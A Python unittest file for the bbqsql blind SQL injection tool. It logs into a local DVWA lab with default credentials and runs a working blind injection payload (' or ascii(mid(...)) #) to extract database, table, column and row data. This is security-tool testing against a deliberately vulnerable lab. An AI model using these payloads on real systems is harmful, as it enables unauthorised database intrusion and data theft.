import sys
import unittest
import requests
from urllib import quote
from gevent.hub import BlockingSwitchOutError

import bbqsql

# test2_server setup
url = 'http://localhost:9191/'
sess = requests.Session()
res = sess.get(url + 'login.php')
ut = res.content.split("user_token'")[1].split("'")[1]
res = sess.post(url + 'login.php', data=dict(username='', password='', user_token=ut, Login='Login'))
if 'First time using DVWA.' in res.content:
    ut = res.content.split("user_token'")[1].split("'")[1]
    res = sess.post(url + 'setup.php', data=dict(user_token=ut, create_db=1))
res = sess.get(url + 'login.php')
ut = res.content.split("user_token'")[1].split("'")[1]
res = sess.post(url + 'login.php', data=dict(username='admin', password='password', user_token=ut, Login='Login'))
assert not 'Login failed' in res.content

sessid = sess.cookies.get('PHPSESSID')

bbqsql.settings.PRETTY_PRINT = False
bbqsql.settings.PRETTY_PRINT_FREQUENCY = 1.
bbqsql.settings.QUIET = False


attack_config = {}
attack_config['cookies'] = {
    'PHPSESSID': sessid,
    'security': 'low',
}
attack_config['technique'] = 'binary_search'
attack_config['technique'] = 'frequency_search'
attack_config['concurrency'] = 5
attack_config['menu_mode'] = False # prevent  printing '\n'*100

# dvwa 
url = bbqsql.Query('http://localhost:9191/vulnerabilities/sqli_blind/?id=${dejection}&Submit=Submit', encoder=quote)

def fetch_(field, interact=False):
    sql = ('(%s limit 1 offset ${row_index:1})' if 'from' in field else '(%s)') % field
    query = bbqsql.Query("' or ascii(mid(%s, ${char_index:1}, 1))${comparator:>}${char_val:0} #" % sql)
    b = bbqsql.BlindSQLi(url=url, query=query, 
            method='GET', comparison_attr='status_code', **attack_config)
    if interact:
        if not b.error:
            try:
                ok = raw_input('Everything lookin groovy?[y,n] ')
            except KeyboardInterrupt:
                ok = False
            if ok and ok[0] != 'n':
                return b.run()
        print(b.error)
    else:
        return b.run()

args = {
    'dbs': 'select schema_name from information_schema.schemata',
    'tables': 'select table_name from information_schema.tables',
    'columns': 'select column_name from information_schema.columns',
}

where_args = {
    'db': 'table_schema="%s"',
    'table': 'table_name="%s"'
}

class TestEncoderWithDVWA(unittest.TestCase):

    def test_fetch_dbs(self):
        dbs = fetch_(args['dbs'])
        self.assertEqual(dbs, ['dvwa', 'information_schema'])

    def test_fetch_tables(self):
        db = 'dvwa'
        has_db = db or False
        if has_db:
            field = '%s where %s' % (args['tables'], where_args['db'] % db)
        else:
            field = args['tables']
        tables = fetch_(field)
        self.assertEqual(tables, ['guestbook', 'users'])

    def test_fetch_columns(self):
        db, table = 'dvwa', 'guestbook'
        has_db = db or False
        has_table = table or False
        if not (has_db and has_table):
            field = args['columns']
        elif has_db and has_table:
            field = '%s where %s and %s' % (args['columns'], where_args['db'] % db, where_args['table'] % table)
        elif has_db:
            field = '%s where %s' % (args['columns'], where_args['db'] % db)
        else:
            field = '%s where %s' % (args['columns'], where_args['table'] % table)
        columns = fetch_(field)
        self.assertEqual(columns, ['comment_id', 'comment', 'name'])

    def test_fetch_rows(self):
        db, table = 'dvwa', 'guestbook'
        columns = ['comment_id', 'comment', 'name']
        field = 'select concat(%s) from %s.%s' % (',0x7c,'.join(columns), db, table)
        entries = fetch_(field)
        self.assertEqual(entries, ['1|This is a test comment.|test'])

if __name__ == '__main__':
    unittest.main()
